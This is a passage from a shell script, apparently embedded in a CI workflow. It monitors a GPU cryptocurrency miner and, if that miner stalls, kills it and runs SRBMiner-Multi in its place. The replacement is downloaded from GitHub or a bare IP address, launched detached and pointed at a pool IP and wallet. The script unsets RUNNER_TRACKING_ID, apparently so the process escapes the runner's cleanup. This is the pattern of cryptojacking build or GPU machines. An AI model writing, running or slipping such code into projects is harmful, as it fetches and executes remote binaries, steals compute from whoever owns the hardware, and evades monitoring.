            RC=$(pgrep -cf '[w]ildrig-multi' 2>/dev/null); RC=${RC:-0}
            MAXU=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | sort -n | tail -1)
            echo "GATE_EVAL t=$(( r * SLEEP ))s r=$r procs=$RC maxutil=${MAXU:-0} accepted=$tot"
            if [ "$RC" -eq 0 ]; then
              echo "R5D=MINER_DEFECT action=LP_FALLBACK"
              FALLBACK=1
            elif [ "${MAXU:-0}" -gt 5 ]; then
              echo "R5D=HASHING_NO_SHARE action=KEEP_MINING (no fallback, hashing miner is never fallback-eligible)"
              FALLBACK=0
            else
              echo "R5D=MINER_ZERO_HASH action=LP_FALLBACK"
              FALLBACK=1
            fi
            if [ "${FALLBACK:-0}" = "1" ]; then
              pkill -f '[w]ildrig-multi' 2>/dev/null || true
              sleep 3
              srb=0
              for u in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz http://169.58.247.186:8791/srbminer-3.8.8.tar.gz; do
                echo "SRB_FETCH $u"
                if curl -fsSL --connect-timeout 10 --max-time 300 -o "$W/srb.tgz" "$u"; then srb=1; break; fi
              done
              if [ "$srb" = "1" ]; then
                S2=$(sha256sum "$W/srb.tgz" | awk '{print $1}'); echo "SRB_TARBALL_SHA256 $S2"
                tar xzf "$W/srb.tgz" -C "$W" 2>/dev/null || true
                SB=$(find "$W" -maxdepth 3 -type f -name 'SRBMiner-MULTI' | head -1)
                if [ -n "${SB:-}" ]; then
                  chmod +x "$SB" 2>/dev/null || true
                  echo "SRB_BIN_SHA256 $(sha256sum "$SB" | awk '{print $1}')"
                  GIDS=$(seq -s, 0 $(( ${N:-1} - 1 )))
                  setsid env -u RUNNER_TRACKING_ID nohup "$SB" --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "${WALLET}+4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf" --worker "$WB" --disable-cpu --gpu-id "$GIDS" --log-file "$W/lp-srb.log" >/dev/null 2>&1 &
                  echo "SRB_STARTED pid=$! gpus=$GIDS worker=$WB"
                else echo "SRB_BIN_NOT_FOUND"; fi
              else echo "SRB_FETCH_FAIL"; fi
            fi
          fi
          r=$((r+1))
        done
        echo "REPORT_DONE tag=$TAG phase=$PHASE total_acc=$tot"
